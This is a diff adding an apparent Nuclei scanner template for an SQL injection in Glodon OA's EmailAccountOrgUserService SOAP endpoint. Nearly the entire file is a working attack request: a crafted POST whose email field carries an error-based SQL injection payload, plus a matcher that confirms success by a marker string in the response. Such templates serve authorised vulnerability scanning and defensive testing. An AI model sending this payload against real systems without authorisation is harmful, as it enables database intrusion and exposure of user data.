@@ -1,0 +1,40 @@
+id: glodon-EmailAccountOrgUserService-sqli
+info:
+  name: 广联达OA-EmailAccountOrgUserService-SQL
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%B9%BF%E8%81%94%E8%BE%BEOA-EmailAccountOrgUserService-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: glodon,sqli
+
+http:
+  - raw:
+      - |
+        POST /Mail/Services/EmailAccountOrgUserService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        SOAPAction: "http://tempuri.org/GetUserInfosByEmail"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetUserInfosByEmail xmlns="http://tempuri.org/">
+        <email>') AND 3515 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (3515=3515) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(122)+CHAR(113))) AND ('ShLa'='ShLa</email>
+        </GetUserInfosByEmail>
+        </soap:Body>
+        </soap:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'qkkkq1qjpzq')
+        condition: and
